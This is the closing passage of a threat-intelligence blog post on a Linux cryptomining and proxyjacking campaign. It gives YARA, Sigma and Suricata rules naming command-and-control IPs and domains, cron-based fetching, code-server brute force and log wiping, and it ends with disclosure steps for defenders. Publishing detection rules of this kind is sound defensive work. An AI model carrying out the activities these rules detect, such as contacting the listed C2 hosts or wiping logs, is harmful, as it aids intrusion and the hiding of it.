+rule iocs_traffmonetizer_operator_tokens
+{
+    meta:
+        description = "Operator Traffmonetizer tokens -- critical if found outside known install"
+        mitre       = "T1078"
+    strings:
+        $tok1 = "uUbGvGz7zAMgGtHsTo8EOi1krvj+OPi7SF5UMeoCJnU="
+        $tok2 = "jUliaNLclI34oUpjC7ewra/HjEuw+UgYa7jrpxMBC3k="
+    condition:
+        any of them
+}</code></pre>
+
+<h3>Sigma (selected)</h3>
+
+<pre><code>title: Cron job fetching from andrewtatemunity C2
+id: 6f0f9c19-2e7e-4f4d-89bd-94c109af1f6a
+status: stable
+tags: [attack.persistence, attack.t1053.003]
+logsource: { product: linux, service: auditd }
+detection:
+  cron_c2:
+    CommandLine|contains:
+      - '94.26.106.195'
+      - 'andrewtatemunityxcrypto.com'
+      - '149.28.129.194'
+  cron_marker:
+    CommandLine|contains:
+      - '*/5 * * * *'
+      - 'check1.sh'
+  condition: cron_c2 and cron_marker
+level: high
+
+---
+title: code-server brute-force spike followed by /var/tmp exec
+id: 0d2a8f73-7f76-4e3c-9b8a-19e1c6c6ad21
+status: experimental
+tags: [attack.initial_access, attack.t1110.001, attack.execution, attack.t1059.004]
+detection:
+  failed_login:
+    message|contains: 'Failed login attempt'
+    message|contains: '"userAgent":"Go-http-client/1.1"'
+  exec_followup:
+    ParentImage|contains: 'code-server'
+    CommandLine|contains: ['/var/tmp/', 'http://94.26.106.195']
+  condition:
+    failed_login | count() by remoteAddress > 200
+    | within 30m
+    | followed by exec_followup
+level: critical
+
+---
+title: Mass /var/log and utmp wipe in single shell pipeline
+id: bf8c0e14-9e6a-4ce6-99e5-9fb3c6d01b9c
+status: stable
+tags: [attack.defense_evasion, attack.t1070.002]
+detection:
+  shell:
+    Image|endswith: '/bash'
+    CommandLine|contains: 'rm -rf'
+  multi_wipe:
+    CommandLine|contains|all:
+      - '/var/log/auth.log'
+      - 'wtmp'
+      - 'btmp'
+  condition: shell and multi_wipe
+level: critical</code></pre>
+
+<h3>Suricata (selected)</h3>
+
+<pre><code>alert http $HOME_NET any -> any any (
+    msg:"ZNTRAQ andrewtatemunity C2 -- HTTP to 94.26.106.195";
+    flow:to_server,established;
+    http.host; content:"94.26.106.195"; nocase;
+    classtype:trojan-activity; sid:4000001; rev:1;)
+
+alert tcp $HOME_NET any -> [94.26.106.195,57.129.119.218,141.94.96.71] any (
+    msg:"ZNTRAQ andrewtatemunity Stratum to operator pool";
+    flow:to_server,established;
+    content:"{\"jsonrpc\""; nocase;
+    classtype:trojan-activity; sid:4000011; rev:1;)
+
+alert dns $HOME_NET any -> any any (
+    msg:"ZNTRAQ andrewtatemunity -- pool domain DNS query";
+    dns.query; content:"andrewtatemunityxcrypto.com"; nocase;
+    classtype:trojan-activity; sid:4000020; rev:1;)
+
+alert tcp $HOME_NET any -> $EXTERNAL_NET 769 (
+    msg:"ZNTRAQ proxyjacking -- TCP/769 outbound (Traffmonetizer pattern)";
+    flow:to_server,established;
+    classtype:policy-violation; sid:4000030; rev:1;)
+
+alert http any any -> $HOME_NET 8080 (
+    msg:"ZNTRAQ code-server brute force -- Go-http-client/1.1";
+    flow:to_server,established;
+    http.user_agent; content:"Go-http-client/1.1";
+    http.uri; content:"/login";
+    threshold: type threshold, track by_src, count 5, seconds 60;
+    classtype:attempted-admin; sid:4000040; rev:1;)
+
+alert ip [91.224.92.34,141.98.11.174,185.241.208.217] any -> $HOME_NET any (
+    msg:"ZNTRAQ andrewtatemunity -- known attacker IP";
+    classtype:trojan-activity; sid:4000041; rev:1;)</code></pre>
+
+<h2>Disclosure and action items</h2>
+
+<div class="callout">
+  All ten binary SHA256s and all operator-private strings (andrewtatemunity, merge boss, Error84 in malware context) produced zero results across MalwareBazaar, ThreatFox, VirusTotal, JoeSandbox, ANY.RUN, AlienVault OTX, and URLhaus at time of investigation. This is a first publication of these IOCs.
+</div>
+
+<p>Recommended steps for defenders and researchers:</p>
+
+<p>Submit the binary hashes to MalwareBazaar and ThreatFox with the YARA rules above. File the domains with Porkbun (<code>abuse@porkbun.com</code>) and Cloudflare abuse for <code>andrewtatemunityxcrypto.com</code>. Report the two Traffmonetizer tokens to <code>admin@traffmonetizer.com</code> citing ToS non-consenting device install -- this is the cheapest action with a meaningful chance of disrupting the proxyjacking income. File OVH abuse for 57.129.119.218, 141.94.96.71, and 54.38.33.16. Contact Huntress with the IOC bundle to merge tracking against the FH8a7d7M case. CERT-RO is the appropriate national contact given the linguistic and likely-Romanian origin.</p>
+
+<p>Do not poison or exploit the operator's open C2 directory. The open listing is a free intelligence feed; leaving it intact allows continued passive observation of any new file additions.</p>
+
+<hr>
+
+<footer>
+  <a href="/">nehemiyawicks.github.io</a>
+</footer>
+
+</body>
+</html>
